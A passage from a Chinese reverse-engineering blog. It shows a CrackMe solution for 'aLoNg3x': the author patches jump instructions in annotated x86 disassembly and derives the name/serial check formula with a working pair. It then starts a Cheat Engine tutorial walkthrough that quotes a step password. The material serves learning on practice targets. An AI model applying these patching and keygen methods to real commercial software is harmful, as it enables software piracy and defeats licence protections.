class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">00442E22   | 8078 47 00         | cmp byte ptr ds:[eax+47],0                   |<br>00442E26   | 75 0F              | jne along3x.1.442E37                         |<br>00442E28   | B2 01              | mov dl,1                                     |<br>00442E2A   | 8B83 CC020000      | mov eax,dword ptr ds:[ebx+2CC]               |<br>00442E30   | 8B08               | mov ecx,dword ptr ds:[eax]                   |<br>00442E32   | FF51 60            | call dword ptr ds:[ecx+60]                   |<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/18/5cb858892f748.png"></p><p>在Ok按钮的处理函数中爆破掉两个跳转指令之后按钮消失：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asm">00442D80   | 8078 47 01         | cmp byte ptr ds:[eax+47],1                   |<br>00442D84   | 75 12              | jne along3x.1.442D98                         |<br>00442D86   | BA 002E4400        | mov edx,along3x.1.442E00                     |<br>00442D8B   | 8B83 E0020000      | mov eax,dword ptr ds:[ebx+2E0]               |<br>00442D91   | E8 5A05FEFF        | call along3x.1.4232F0                        |<br>00442D96   | EB 3F              | jmp along3x.1.442DD7                         |<br>00442D98   | 8D55 FC            | lea edx,dword ptr ss:[ebp-4]                 |<br>00442D9B   | 8B83 E0020000      | mov eax,dword ptr ds:[ebx+2E0]               |<br>00442DA1   | E8 1A05FEFF        | call along3x.1.4232C0                        |<br>00442DA6   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 |<br>00442DA9   | E8 C248FCFF        | call along3x.1.407670                        |<br>00442DAE   | 50                 | push eax                                     |<br>00442DAF   | 8D55 FC            | lea edx,dword ptr ss:[ebp-4]                 |<br>00442DB2   | 8B83 DC020000      | mov eax,dword ptr ds:[ebx+2DC]               |<br>00442DB8   | E8 0305FEFF        | call along3x.1.4232C0                        |<br>00442DBD   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 |<br>00442DC0   | 5A                 | pop edx                                      |<br>00442DC1   | E8 DAFDFFFF        | call along3x.1.442BA0                        |<br>00442DC6   | 84C0               | test al,al                                   |<br>00442DC8   | 74 0D              | je along3x.1.442DD7                          |<br>00442DCA   | 33D2               | xor edx,edx                                  |<br>00442DCC   | 8B83 CC020000      | mov eax,dword ptr ds:[ebx+2CC]               |<br>00442DD2   | E8 D903FEFF        | call along3x.1.4231B0                        |<br></code></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/04/18/5cb8596e45f33.png"></p><p>同样在<code>Cancella</code>按钮的处理函数中也有如下逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">00442EE7   | E8 08FCFFFF        | call along3x.1.442AF4                        |<br>00442EEC   | 84C0               | test al,al                                   |<br>00442EEE   | 74 1C              | je along3x.1.442F0C                          |<br></code></pre></td></tr></table></figure><p>爆破之后发现两个按钮都消失了，达到了题目效果：</p><p><img src="https://i.loli.net/2019/04/18/5cb85a416cd54.png"></p><p>还是要看一下判断逻辑，找到<code>Cancella</code>按钮处理函数中关键的跳转前的判断函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asm">00442ECF   | E8 9C47FCFF        | call along3x.1.407670                        | 获取密码<br>00442ED4   | 50                 | push eax                                     | eax:&quot;1234567890&quot;<br>00442ED5   | 8D55 FC            | lea edx,dword ptr ss:[ebp-4]                 | [ebp-4]:&quot;1234567890&quot;<br>00442ED8   | 8B83 DC020000      | mov eax,dword ptr ds:[ebx+2DC]               | eax:&quot;1234567890&quot;<br>00442EDE   | E8 DD03FEFF        | call along3x.1.4232C0                        | 获取用户名<br>00442EE3   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 | [ebp-4]:&quot;1234567890&quot;<br>00442EE6   | 5A                 | pop edx                                      |<br>00442EE7   | E8 08FCFFFF        | call along3x.1.442AF4                        |<br>00442EEC   | 84C0               | test al,al                                   |<br>00442EEE   | 74 1C              | je along3x.1.442F0C                          |<br></code></pre></td></tr></table></figure><p>单步步进看一下，找到如下运算过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs asm">00442AF4   | 55                 | push ebp                                     |<br>00442AF5   | 8BEC               | mov ebp,esp                                  |<br>00442AF7   | 83C4 F8            | add esp,FFFFFFF8                             |<br>00442AFA   | 53                 | push ebx                                     | ebx:&quot;,(D&quot;<br>00442AFB   | 56                 | push esi                                     |<br>00442AFC   | 8955 F8            | mov dword ptr ss:[ebp-8],edx                 |<br>00442AFF   | 8945 FC            | mov dword ptr ss:[ebp-4],eax                 | [ebp-4]:&quot;ZZZZZZZZZZ&quot;<br>00442B02   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 | [ebp-4]:&quot;ZZZZZZZZZZ&quot;<br>00442B05   | E8 DE10FCFF        | call along3x.1.403BE8                        | 判断字符串是否为空<br>00442B0A   | 33C0               | xor eax,eax                                  | eax:&quot;ZZZZZZZZZZ&quot;<br>00442B0C   | 55                 | push ebp                                     |<br>00442B0D   | 68 902B4400        | push along3x.1.442B90                        |<br>00442B12   | 64:FF30            | push dword ptr fs:[eax]                      |<br>00442B15   | 64:8920            | mov dword ptr fs:[eax],esp                   |<br>00442B18   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 | [ebp-4]:&quot;ZZZZZZZZZZ&quot;<br>00442B1B   | E8 140FFCFF        | call along3x.1.403A34                        | 获取name字段长度<br>00442B20   | 83F8 05            | cmp eax,5                                    | 用户名长度是否大于5<br>00442B23   | 7E 53              | jle along3x.1.442B78                         |<br>00442B25   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 | [ebp-4]:&quot;ZZZZZZZZZZ&quot;<br>00442B28   | 0FB640 04          | movzx eax,byte ptr ds:[eax+4]                | 取用户名第5位字母的ASCII<br>00442B2C   | B9 07000000        | mov ecx,7                                    |<br>00442B31   | 33D2               | xor edx,edx                                  |<br>00442B33   | F7F1               | div ecx                                      |<br>00442B35   | 8BC2               | mov eax,edx                                  | 用户名第5位字母的ASCII值/7<br>00442B37   | 83C0 02            | add eax,2                                    | 取余+2<br>00442B3A   | E8 E1FEFFFF        | call along3x.1.442A20                        | 余数+2的阶乘<br>00442B3F   | 8BF0               | mov esi,eax                                  | eax:&quot;ZZZZZZZZZZ&quot;<br>00442B41   | 33DB               | xor ebx,ebx                                  | ebx:&quot;,(D&quot;<br>00442B43   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 | [ebp-4]:&quot;ZZZZZZZZZZ&quot;<br>00442B46   | E8 E90EFCFF        | call along3x.1.403A34                        | 判断用户名是否为空<br>00442B4B   | 85C0               | test eax,eax                                 | eax:&quot;ZZZZZZZZZZ&quot;<br>00442B4D   | 7E 16              | jle along3x.1.442B65                         |<br>00442B4F   | BA 01000000        | mov edx,1                                    |<br>00442B54   | 8B4D FC            | mov ecx,dword ptr ss:[ebp-4]                 | [ebp-4]:&quot;ZZZZZZZZZZ&quot;<br>00442B57   | 0FB64C11 FF        | movzx ecx,byte ptr ds:[ecx+edx-1]            | 对用户名循环取值<br>00442B5C   | 0FAFCE             | imul ecx,esi                                 | name[i]*(余数＋2的阶乘)<br>00442B5F   | 03D9               | add ebx,ecx                                  | 对上一步运算求和<br>00442B61   | 42                 | inc edx                                      |<br>00442B62   | 48                 | dec eax                                      | eax:&quot;ZZZZZZZZZZ&quot;<br>00442B63   | 75 EF              | jne along3x.1.442B54                         |<br>00442B65   | 2B5D F8            | sub ebx,dword ptr ss:[ebp-8]                 | 求和的结果-注册码                              |<br>00442B68   | 81FB 697A0000      | cmp ebx,7A69                                 | 判断差是否等于0x7A69<br>00442B6E   | 75 04              | jne along3x.1.442B74                         |<br>00442B70   | B3 01              | mov bl,1                                     |<br>00442B72   | EB 06              | jmp along3x.1.442B7A                         |<br>00442B74   | 33DB               | xor ebx,ebx                                  | ebx:&quot;,(D&quot;<br>00442B76   | EB 02              | jmp along3x.1.442B7A                         |<br>00442B78   | 33DB               | xor ebx,ebx                                  | ebx:&quot;,(D&quot;<br>00442B7A   | 33C0               | xor eax,eax                                  | eax:&quot;ZZZZZZZZZZ&quot;<br>00442B7C   | 5A                 | pop edx                                      |<br>00442B7D   | 59                 | pop ecx                                      |<br>00442B7E   | 59                 | pop ecx                                      |<br>00442B7F   | 64:8910            | mov dword ptr fs:[eax],edx                   |<br>00442B82   | 68 972B4400        | push along3x.1.442B97                        |<br>00442B87   | 8D45 FC            | lea eax,dword ptr ss:[ebp-4]                 | [ebp-4]:&quot;ZZZZZZZZZZ&quot;<br>00442B8A   | E8 290CFCFF        | call along3x.1.4037B8                        |<br>00442B8F   | C3                 | ret                                          |<br></code></pre></td></tr></table></figure><p>可以分析出算法：用户名第5个字母的ASCII码处以7的余数加2为X，算出X的阶乘Y，Y乘用户名ASCII值的和得Z，Z-serial&#x3D;0x7A69时验证通过。</p><p>公式：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">serial</span> = ((((name[<span class="hljs-number">4</span>]%<span class="hljs-number">7</span>) + <span class="hljs-number">2</span>)!)*(name[<span class="hljs-number">0</span>] + name[<span class="hljs-number">1</span>] + ... + name[i])) - <span class="hljs-number">0</span>x7A69<br></code></pre></td></tr></table></figure><p>按照这个逻辑得出<code>ZZZZZZZZZZ</code>对应的注册码是<code>36256663</code>，输入之后发现<code>Cancella</code>按钮消失且Ok按钮状态改变：</p><p><img src="https://i.loli.net/2019/04/18/5cb87a9fb944b.png"></p><p>但是此时点Ok按钮还是没有任何反应，因此猜测Ok按钮处也有验证算法，话不多说下断：</p><p>Ok按钮的处理函数如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs asm">00442D64   | 55                 | push ebp                                     | OK_Click<br>00442D65   | 8BEC               | mov ebp,esp                                  |<br>00442D67   | 6A 00              | push 0                                       |<br>00442D69   | 53                 | push ebx                                     |<br>00442D6A   | 8BD8               | mov ebx,eax                                  | eax:&quot;,(D&quot;<br>00442D6C   | 33C0               | xor eax,eax                                  | eax:&quot;,(D&quot;<br>00442D6E   | 55                 | push ebp                                     |<br>00442D6F   | 68 ED2D4400        | push along3x.1.442DED                        |<br>00442D74   | 64:FF30            | push dword ptr fs:[eax]                      |<br>00442D77   | 64:8920            | mov dword ptr fs:[eax],esp                   |<br>00442D7A   | 8B83 D0020000      | mov eax,dword ptr ds:[ebx+2D0]               | eax:&quot;,(D&quot;<br>00442D80   | 8078 47 01         | cmp byte ptr ds:[eax+47],1                   |<br>00442D84   | 75 12              | jne along3x.1.442D98                         |<br>00442D86   | BA 002E4400        | mov edx,along3x.1.442E00                     |<br>00442D8B   | 8B83 E0020000      | mov eax,dword ptr ds:[ebx+2E0]               | eax:&quot;,(D&quot;<br>00442D91   | E8 5A05FEFF        | call along3x.1.4232F0                        |<br>00442D96   | EB 3F              | jmp along3x.1.442DD7                         |<br>00442D98   | 8D55 FC            | lea edx,dword ptr ss:[ebp-4]                 |<br>00442D9B   | 8B83 E0020000      | mov eax,dword ptr ds:[ebx+2E0]               | eax:&quot;,(D&quot;<br>00442DA1   | E8 1A05FEFF        | call along3x.1.4232C0                        |<br>00442DA6   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 |<br>00442DA9   | E8 C248FCFF        | call along3x.1.407670                        |<br>00442DAE   | 50                 | push eax                                     | eax:&quot;,(D&quot;<br>00442DAF   | 8D55 FC            | lea edx,dword ptr ss:[ebp-4]                 |<br>00442DB2   | 8B83 DC020000      | mov eax,dword ptr ds:[ebx+2DC]               | eax:&quot;,(D&quot;<br>00442DB8   | E8 0305FEFF        | call along3x.1.4232C0                        |<br>00442DBD   | 8B45 FC            | mov eax,dword ptr ss:[ebp-4]                 |<br>00442DC0   | 5A                 | pop edx                                      |<br>00442DC1   | E8 DAFDFFFF        | call along3x.1.442BA0                        | 隐藏Ok按钮的判断函数<br>00442DC6   | 84C0               | test al,al                                   |<br>00442DC8   | 74 0D              | je along3x.1.442DD7                          | Ok按钮隐藏<br>00442DCA   | 33D2               | xor edx,edx                                  |<br>00442DCC   | 8B83 CC020000      | mov eax,dword ptr ds:[ebx+2CC]               | eax:&quot;,(D&quot;<br>00442DD2   | E8 D903FEFF        | call along3x.1.4231B0                        |<br>00442DD7   | 33C0               | xor eax,eax                                  | eax:&quot;,(D&quot;<br>00442DD9   | 5A                 | pop edx                                      |<br>00442DDA   | 59                 | pop ecx                                      |<br>00442DDB   | 59                 | pop ecx                                      |<br>00442DDC   | 64:8910            | mov dword ptr fs:[eax],edx                   |<br>00442DDF   | 68 F42D4400        | push along3x.1.442DF4                        |<br>00442DE4   | 8D45 FC            | lea eax,dword ptr ss:[ebp-4]                 |<br>00442DE7   | E8 CC09FCFF        | call along3x.1.4037B8                        |<br>00442DEC   | C3                 | ret                                          |<br>00442DED   | E9 8604FCFF        | jmp along3x.1.403278                         |<br>00442DF2   | EB F0              | jmp along3x.1.442DE4                         |<br>00442DF4   | 5B                 | pop ebx                                      |<br>00442DF5   | 59                 | pop ecx                                      |<br>00442DF6   | 5D                 | pop ebp                                      |<br>00442DF7   | C3                 | ret                                          |<br></code></pre></td></tr></table></figure><p>找到442BA0，进去看一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">00442BF9   | 8D45 F4            | lea eax,dword ptr ss:[ebp-C]                 | [ebp-C]:&quot;362566MI&quot;<br>00442BFC   | E8 0310FCFF        | call along3x.1.403C04                        |<br>00442C01   | 8D4430 FF          | lea eax,dword ptr ds:[eax+esi-1]             |<br>00442C05   | 50                 | push eax                                     |<br>00442C06   | 8B45 F8            | mov eax,dword ptr ss:[ebp-8]                 | [ebp-8]:&quot;36256663&quot;<br>00442C09   | 0FB64430 FF        | movzx eax,byte ptr ds:[eax+esi-1]            |<br>00442C0E   | F7E8               | imul eax                                     | 每个数字平方<br>00442C10   | 0FBFC0             | movsx eax,ax                                 |<br>00442C13   | F7EE               | imul esi                                     | *剩余注册码的长度<br>00442C15   | B9 19000000        | mov ecx,19                                   |<br>00442C1A   | 99                 | cdq                                          |<br>00442C1B   | F7F9               | idiv ecx                                     | /19<br>00442C1D   | 83C2 41            | add edx,41                                   | 余数+41<br>00442C20   | 58                 | pop eax                                      |<br>00442C21   | 8810               | mov byte ptr ds:[eax],dl                     |<br>00442C23   | 4E                 | dec esi                                      |<br>00442C24   | 85F6               | test esi,esi                                 |<br>00442C26   | 75 D1              | jne along3x.1.442BF9                         |<br></code></pre></td></tr></table></figure><p>首先注册码长度要大于5，倒序对注册码中每个数字进行处理，第i个数字的平方乘以未处理注册码字符的长度再与19取余，结果加41后得出用户名的第i个字母。</p><p>当注册码为<code>36256663</code>时运算得出的用户名为<code>BHALFVMI</code>，输入程序发现Ok按钮也消失了：</p><p><img src="https://i.loli.net/2019/04/18/5cb88853a1afc.png"></p><h1 id="0x07-aLoNg3x-2"><a href="#0x07-aLoNg3x-2" class="headerlink" title="0x07 aLoNg3x_2"></a>0x07 aLoNg3x_2</h1>]]></content>
    
    
    
    <tags>
      
      <tag>CrackMe</tag>
      
      <tag>逆向</tag>
      
      <tag>破解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cheat Engine练习</title>
    <link href="/2019/03/Cheat-Engine%E7%BB%83%E4%B9%A0/"/>
    <url>/2019/03/Cheat-Engine%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>打开Cheat Engine Tutorial，有如下帮助提示：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Welcome <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> Cheat Engine Tutorial (v3<span class="hljs-number">.3</span>)<br><br>This tutorial will teach you <span class="hljs-keyword">the</span> basics <span class="hljs-keyword">of</span> cheating <span class="hljs-keyword">in</span> video games. It will also show you foundational aspects <span class="hljs-keyword">of</span> using Cheat Engine (<span class="hljs-keyword">or</span> CE <span class="hljs-keyword">for</span> short). Follow <span class="hljs-keyword">the</span> steps <span class="hljs-keyword">below</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> started.<br><span class="hljs-number">1</span>: Open Cheat Engine <span class="hljs-keyword">if</span> <span class="hljs-keyword">it</span> currently <span class="hljs-keyword">isn&#x27;t</span> <span class="hljs-built_in">running</span>.<br><span class="hljs-number">2</span>: Click <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Open Process&quot;</span> icon (<span class="hljs-keyword">it</span>&#x27;s <span class="hljs-keyword">the</span> top-left icon <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> computer <span class="hljs-keyword">on</span> <span class="hljs-keyword">it</span>, <span class="hljs-keyword">below</span> <span class="hljs-string">&quot;File&quot;</span>.).<br><span class="hljs-number">3</span>: With <span class="hljs-keyword">the</span> Process List window now open, look <span class="hljs-keyword">for</span> this tutorial&#x27;s process <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">list</span>. It will look something like <span class="hljs-string">&quot;00001F98-Tutorial-x86_64.exe&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;0000047C-Tutorial-i386.exe&quot;</span>. (The <span class="hljs-keyword">first</span> <span class="hljs-number">8</span> numbers/letters will probably be different.)<br><span class="hljs-number">4</span>: Once you&#x27;ve found <span class="hljs-keyword">the</span> process, click <span class="hljs-keyword">on</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">to</span> select <span class="hljs-keyword">it</span>, <span class="hljs-keyword">then</span> click <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Open&quot;</span> button. (Don&#x27;t worry <span class="hljs-keyword">about</span> all <span class="hljs-keyword">the</span> other buttons right now. You can learn <span class="hljs-keyword">about</span> them later <span class="hljs-keyword">if</span> you&#x27;re interested.)<br>Congratulations! If you did everything correctly, <span class="hljs-keyword">the</span> process window should be gone <span class="hljs-keyword">with</span> Cheat Engine now attached <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> tutorial (you will see <span class="hljs-keyword">the</span> process <span class="hljs-built_in">name</span> towards <span class="hljs-keyword">the</span> top-center <span class="hljs-keyword">of</span> CE).<br>Click <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Next&quot;</span> button <span class="hljs-keyword">below</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span>, <span class="hljs-keyword">or</span> fill <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> password <span class="hljs-keyword">and</span> click <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;OK&quot;</span> button <span class="hljs-keyword">to</span> proceed <span class="hljs-keyword">to</span> <span class="hljs-keyword">that</span> step.)<br>If you&#x27;re having problems, simply head <span class="hljs-keyword">over</span> <span class="hljs-keyword">to</span> forum.cheatengine.org, <span class="hljs-keyword">then</span> click <span class="hljs-keyword">on</span> <span class="hljs-string">&quot;Tutorials&quot;</span> <span class="hljs-keyword">to</span> view beginner-friendly guides!<br></code></pre></td></tr></table></figure><span id="more"></span><p>有道翻译之后：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs arduino">欢迎来到作弊引擎教程(v3<span class="hljs-number">.3</span>)<br>本教程将教你在电子游戏中作弊的基本知识。它还将向您展示使用欺骗引擎(或简称CE)的基本方面。按照下面的步骤开始。<br><span class="hljs-number">1</span>:打开作弊引擎，如果它目前没有运行。<br><span class="hljs-number">2</span>:点击“打开进程”图标(左上角有电脑的图标，在“文件”下面)。<br><span class="hljs-number">3</span>:现在打开<span class="hljs-built_in">Process</span> List窗口，在List中查找本教程的<span class="hljs-built_in">Process</span>。它看起来像“<span class="hljs-number">00001F</span>98-Tutorial-x86_64”。exe”或“<span class="hljs-number">0000047</span> c-tutorial-i386.exe”。(前<span class="hljs-number">8</span>个数字/字母可能会有所不同。)<br><span class="hljs-number">4</span>:找到流程后，点击选择，然后点击“打开”按钮。)现在不要担心其他的按钮。如果你感兴趣的话，可以稍后再了解。)<br><br>恭喜你!如果您做的一切都是正确的，那么process窗口应该与现在附加到教程中的Cheat Engine一起消失(您将在CE的顶部中心看到process名称)。<br><br>点击下面的“下一步”按钮继续，或者填写密码，点击“确定”按钮继续下一步。)<br><br>如果你有问题，可以直接访问forum.cheatengine.org，然后点击“教程”查看初学者友好指南!<br></code></pre></td></tr></table></figure><p>第一题：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Step</span> <span class="hljs-number">2</span>: Exact Value scanning (PW=<span class="hljs-number">090453</span>)<br>Now that you have opened the tutorial <span class="hljs-keyword">with</span> Cheat Engine <span class="hljs-keyword">let</span><span class="hljs-comment">&#x27;s get on with the next step.</span><br><br>You can see at the bottom <span class="hljs-keyword">of</span> this window <span class="hljs-built_in">is</span> the <span class="hljs-keyword">text</span> Health: xxx<br><span class="hljs-keyword">Each</span> time you click <span class="hljs-comment">&#x27;Hit me&#x27;  your health gets decreased.</span><br><br><span class="hljs-keyword">To</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">to</span> the <span class="hljs-keyword">next</span> <span class="hljs-keyword">step</span> you have <span class="hljs-keyword">to</span> find this value <span class="hljs-built_in">and</span> change it <span class="hljs-keyword">to</span> <span class="hljs-number">1000</span><br><br><span class="hljs-keyword">To</span> find the value there are different ways, but I<span class="hljs-comment">&#x27;ll tell you about the easiest, &#x27;Exact Value&#x27;:</span><br>First make sure value type <span class="hljs-built_in">is</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span> at least <span class="hljs-number">2</span>-bytes <span class="hljs-built_in">or</span> <span class="hljs-number">4</span>-bytes. <span class="hljs-number">1</span>-<span class="hljs-type">byte</span> will also work, but you<span class="hljs-comment">&#x27;ll run into an easy to fix problem when you&#x27;ve found the address and want to change it. The 8-byte may perhaps works if the bytes after the address are 0, but I wouldn&#x27;t take the bet.</span><br><span class="hljs-type">Single</span>, <span class="hljs-type">double</span>, <span class="hljs-built_in">and</span> the other scans just don<span class="hljs-comment">&#x27;t work, because they store the value in a different way.</span><br><br><span class="hljs-keyword">When</span> the value type <span class="hljs-built_in">is</span> <span class="hljs-keyword">set</span> correctly, make sure the scantype <span class="hljs-built_in">is</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">to</span> <span class="hljs-comment">&#x27;Exact Value&#x27;</span><br><span class="hljs-keyword">Then</span> fill <span class="hljs-keyword">in</span> the number your health <span class="hljs-built_in">is</span> <span class="hljs-keyword">in</span> the value box. <span class="hljs-built_in">And</span> click <span class="hljs-comment">&#x27;First Scan&#x27;</span><br>After a <span class="hljs-keyword">while</span> (<span class="hljs-keyword">if</span> you have a extremely slow pc) the scan <span class="hljs-built_in">is</span> done <span class="hljs-built_in">and</span> the results are shown <span class="hljs-keyword">in</span> the list <span class="hljs-keyword">on</span> the left<br><br><span class="hljs-keyword">If</span> you find more than <span class="hljs-number">1</span> address <span class="hljs-built_in">and</span> you don<span class="hljs-comment">&#x27;t know for sure which address it is, click &#x27;Hit me&#x27;, fill in the new health value into the value box, and click &#x27;Next Scan&#x27;</span><br>repeat this <span class="hljs-keyword">until</span> you<span class="hljs-comment">&#x27;re sure you&#x27;ve found it. (that includes that there&#x27;s only 1 address in the list.....)</span><br><br>Now <span class="hljs-type">double</span> click the address <span class="hljs-keyword">in</span> the list <span class="hljs-keyword">on</span> the left. This makes the address pop-up <span class="hljs-keyword">in</span> the list at the bottom, showing you the current value.<br><span class="hljs-type">Double</span> click the value, (<span class="hljs-built_in">or</span> <span class="hljs-keyword">select</span> it <span class="hljs-built_in">and</span> press enter), <span class="hljs-built_in">and</span> change the value <span class="hljs-keyword">to</span> <span class="hljs-number">1000</span>.<br><br><span class="hljs-keyword">If</span> everything went ok the <span class="hljs-keyword">next</span> button should become enabled, <span class="hljs-built_in">and</span> you<span class="hljs-comment">&#x27;re ready for the next step.</span><br><br><br><span class="hljs-symbol">Note:</span><br><span class="hljs-keyword">If</span> you did anything wrong <span class="hljs-keyword">while</span> scanning, click <span class="hljs-string">&quot;New Scan&quot;</span> <span class="hljs-built_in">and</span> repeat the scanning again.<br>Also, <span class="hljs-keyword">try</span> playing around <span class="hljs-keyword">with</span> the value <span class="hljs-built_in">and</span> click <span class="hljs-comment">&#x27;hit me&#x27;</span><br></code></pre></td></tr></table></figure><p>翻译之后：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 